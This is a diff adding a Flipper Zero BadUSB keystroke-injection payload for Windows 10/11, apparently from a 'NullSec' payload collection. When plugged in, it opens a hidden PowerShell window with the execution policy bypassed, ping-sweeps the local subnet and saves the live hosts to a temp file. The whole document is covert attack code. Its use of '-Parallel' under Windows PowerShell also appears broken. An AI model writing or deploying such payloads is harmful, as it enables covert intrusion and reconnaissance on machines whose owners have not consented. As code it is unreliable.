@@ -1,0 +1,21 @@
+REM ========================================
+REM NullSec Flipper Zero BadUSB
+REM Payload: Network Scanner
+REM Target: Windows 10/11
+REM ========================================
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 1000
+STRING $subnet = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"}).IPAddress -replace '\.\d+$',''
+ENTER
+STRING $results = @()
+ENTER
+STRING 1..254 | ForEach-Object -Parallel { if(Test-Connection -ComputerName "$using:subnet.$_" -Count 1 -Quiet -TimeoutSeconds 1){$_} } -ThrottleLimit 50 | ForEach-Object { $results += "$subnet.$_" }
+ENTER
+STRING $results | Out-File "$env:TEMP\network_scan.txt"
+ENTER
+STRING exit
+ENTER
